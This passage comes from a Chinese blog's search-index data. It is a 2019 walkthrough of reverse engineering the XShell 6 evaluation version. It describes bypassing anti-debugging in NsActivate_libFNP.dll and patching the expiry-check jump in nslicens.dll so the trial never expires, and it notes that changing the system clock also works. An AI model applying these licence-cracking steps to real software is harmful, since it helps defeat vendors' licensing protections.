6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"3. 初步猜测分析 逆向一个软件之前，需要先猜测需要逆向的功能是如何写出来的，这样在逆向的时候将会事半功倍。这个软件我的猜测是这样的： 创建窗口/对话框：这个是肯定的，毕竟也有个到期窗口嘛 检查了时间：这里就不确定是本地检查还是联网检查，需要进一步分析 设置窗口标题：这个可能会设置，也可能对话框本身自己就有名称 程序是否有反调试/加壳：这个需要第一时间检查 ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:3:0","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"4. 正式分析 根据以上的猜测，开始进行正式分析。 ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:0","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"4.1 检查程序是否存在反调试/加壳 第一件事就是检查程序是否有加壳、是否存在反调试，这样才有继续下去的可能性。 检查是否被加壳： PEiD查看主程序 PEiD查壳\" PEiD查壳 从上面可以看到，能识别出来是VC6.0编译的(但是链接器版本是11.0,可能是VS2012编译的，毕竟VC也太老了点)，而且区段很正常，很明显没有加壳 检查是否有反调试： 用无插件的OD和x64Dbg打开程序 检查反调试\" 检查反调试 这里用无插件OD和x64Dbg都能发现程序存在反调试，虽然用吾爱破解OD可以反反调试，不过这里抱着学习的态度，来找找这个反调试： 首先在关键API上下断，我这里先在IsDebuggerPresent下断，发现是可以断下来的： 断点在IsDebuggerPresent\" 断点在IsDebuggerPresent 接下来让程序跑起来可以发现，IsDebuggerPresent这个函数被执行了很多次，需要找到关键的位置，这里的思路是在ExitProcess函数下断，然后栈回溯： 断点在ExitProcess\" 断点在ExitProcess 这里程序是在RtlExitUserProcess函数断下来的，需要注意！！！ 通过分析RtlExitUserProcess的栈回溯，找到了执行关键函数的地方，是在NsActivate_libFNP.dll这个模块中，如下图： 栈回溯ExitProcess\" 栈回溯ExitProcess 从上图可以看出：执行RtlExitUserProcess的关键函数是0x66811264这个函数，而执行0x66811264这个函数的地址是0x6683C342 既然找到了关键地址，那么就来分析这个地址附近的内容，分析如下： 关键位置分析\" 关键位置分析 关键就是EAX与ESI必须相等，否则就退出程序 我这里的目的只是为了让程序不退出，方便调试，所以我没有去具体分析ESI的值怎么来的等等，感兴趣的可以自行去分析一波。我这里将CALL EAX函数中的内容给改了，使EAX = ESI，然后Dump之后替换文件就可以过掉反调试了，修改如下： 修改文件，过掉反调试\" 修改文件，过掉反调试 这里需要注意一点：当替换了文件之后，运行程序可能会报如下错误，这里并不影响程序执行流程，所以可以忽略 \" 这里要说明一下的是，用吾爱破解OD是可以直接过掉这个反调试的，所以接下来我都是使用的吾爱破解OD ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:1","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"4.2 分析创建窗口/对话框 过掉反调试之后，就可以正式开始分析程序了。 逆向破解软件，从能看见的窗口入手，然后往回推是最快的方法。 首先在所有创建窗口/对话框的API上下断，断下来之后观察栈传递的参数，例如下面这样： 窗口传递的参数\" 窗口传递的参数 可以通过观察窗口的类名、名称和回调函数来确定是不是要寻找的窗口。但在这里，如果你使用的是吾爱破解OD的插件设置的API断点的话，那基本上是找不到到期窗口是在哪里被创建的。因为吾爱破解OD的这个插件是这样的： API断点工具\" API断点工具 这个插件可以快捷的设置API断点，但这里你把所有的创建窗口/对话框的API都勾上确定之后，的确很多API上都能被设置上断点，可唯独DialogBoxIndirectParam(A/W)这个API没有设置上断点，而恰恰这个到期窗口就是使用这个API创建的对话框(不要问我为什么知道，我也是调试了很久才找到这个原因的)，所以还是手动设置这些API的断点吧。 这里以DialogBoxIndirectParam(A/W)被设置上断点为基础，发现被调用了一次之后，到期窗口显示出来，那么可以怀疑这次调用就是创建到期窗口，那么可以详细分析，先观察其调用时参数： DialogBoxIndirectParamW\" DialogBoxIndirectParamW 对话框的名称和类都是看不到的，但是可以看到一个对话框的回调函数10001C60，这里可以跟进去看看，就能发现这个回调函数就是到期窗口的回调函数，在这个窗口中设置了窗口的标题，也就是最初猜测的第三点，通过在SetWindowTextA/W下断点有时也能找到一些东西，如下： 设置窗口标题\" 设置窗口标题 既然找到了关键创建窗口的位置，那么就可以栈回溯，找到创建窗口的位置，如下： 到期窗口栈回溯\" 到期窗口栈回溯 通过分析，10001000这个函数是调用DialogBoxIndirectParamW的主要函数，而调用10001000函数的位置是10003F88，也就是说10003F88才是关键需要分析的位置，10003F88所在位置的代码如下： 关键位置代码\" 关键位置代码 从上面可以看到，10003F88这个位置的执行是从某个地方跳转过来的，也就是上面某个位置跳转到了10003F6E这个地方，然后紧接着执行了10001000这个函数，随后创建了到期窗口。通过OD可以查看到是哪里跳转到了10003F6E这里来的，如下： 关键判断位置\" 关键判断位置 从上面可以看到，10003F07和10003F21是跳转的位置，可以直接下断点到这两个地方，然后修改寄存器的值，就可以测试出，只要10003F21不跳转，那么就不会提示到期，然后NOP掉这里程序也就不会提示到期了，就像这样： NOP掉判断位置\" NOP掉判断位置 可以看到已经不会提示到期了，这时就可以Dump下来，然后替换文件就实现了永久不到期的功能了，这里调用的模块是nslicens，所对应的模块是XShell安装目录下的nslicens.dll： 查看模块位置\" 查看模块位置 上面是动态分析的结果，其实找到关键点之后，通过IDA很快就能看出逻辑： IDA观察关键点逻辑\" IDA观察关键点逻辑 而10001000这个函数中是这样的： IDA中10001000函数\" IDA中10001000函数 可以看到资源ID为103，通过Resource Hacker查看资源： ReHacker查看资源\" ReHacker查看资源 ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:2","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"4.3 通过时间分析 上面是基于窗口分析的，是最快的方法。但是我因为最开始DialogBoxIndirectParamW没下上断点，所以我是通过时间分析找到关键点的。 首先要通过时间分析，需要知道它是判断的本地时间还是网络时间，先用本地时间做做测试： 修改本地时间测试\" 修改本地时间测试 可以看到的确是判断的本地时间，也就是说如果不进行逆向，直接修改时间也能达到永久不到期的效果。 接下来就要分析它是在哪判断的时间了。需要在GetLocalTime下断点。这里有一点和上面有点类似，就是与创建窗口/对话框的API一样，可能这个GetLocalTime会被执行很多次，所以需要找到创建到期窗口之前的那次GetLocalTime。我这里分析的时候是第4次执行GetLocalTime时到了关键位置，这时的栈回溯是这样的： 获取时间关键位置栈回溯\" 获取时间关键位置栈回溯 可以看到OD帮忙显示了一些很关键的信息，也就是nslicens这个模块中的导出函数名，而这几个函数名很可疑：CheckLicenseAndPackage、CheckLicense、GetCurrentDate，很明显就是获取当前时间并检查许可证 从上面可以看到，10003E24这个位置获取了当前时间，然后就可以从这个位置开始着手分析，我这里使用的是对比的方法分析的，也就是先把时间改成未到期的时间，观察其跳转，然后再把时间改成到期的时间，再观察其跳转，就能很快找到关键判断位置。我的最后分析如下： 最后分析\" 最后分析 可以看到第二个判断的位置，也就是10003F21的位置，就是上面通过查找窗口的方式找到的关键跳转位置，所以接下来的事情就不用多说了 ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:3","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"5. END 这次分析算是第一个独立分析破解的程序，中途遇到的坑比这写的多了去了。例如第一个对话框API的坑，我连对话框的回调函数都找到了，就是找不到在哪创建的对话框，导致浪费了很长的时间。还有分析时间的时候，因为调用了很多次GetLocalTime，我开始没有想到分析创建窗口之前的那个GetLocalTime，所以我从第一个开始分析的，结果发现前面的根本没鸟用，本来一两个小时就能搞完的东西，导致搞了一整天，这也是经验太少了，这次还是增长了不少快速分析的经验。 最后： [1] 软件版本： 软件版本\" 软件版本 [2] 下载地址：https://www.netsarang.com/zh/all-downloads/ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:5:0","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"}]